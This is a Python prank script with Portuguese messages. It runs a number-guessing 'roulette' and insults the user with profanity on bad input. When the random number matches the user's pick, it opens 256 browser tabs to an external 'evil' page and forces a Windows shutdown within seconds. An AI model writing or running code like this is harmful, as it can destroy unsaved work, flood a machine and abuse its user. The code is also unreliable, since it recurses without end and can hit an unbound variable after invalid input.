import random
import os
import sys
import time
import webbrowser

def sorteio():
    print("Olá, mundo!")
    opcoes=6
    sorteado=random.randint(1, opcoes)
    try:
        escolha=int(input(f"Escolha seu destino (1 a {opcoes}): "))
        if escolha > opcoes or escolha < 1:
            print("Vá se foder; faça direito!")
            sorteio()
    except ValueError as mensagem:
        print(f"Você é uma vergonha para a humanidade... {mensagem}")
        sorteio()
    if escolha == sorteado:
        print("PARABÉNS, IDIOTA, SE LASCOU! Seu destino está selado.")
        janelas()
        time.sleep(2)
        os.system("shutdown /s /t 2")
    else:
        print("As Forças Supremas pouparam você... por enquanto.")
        sorteio()

def janelas():
    url="http://toastytech.com/evil/"
    for i in range(256):
        webbrowser.open(url)

sorteio()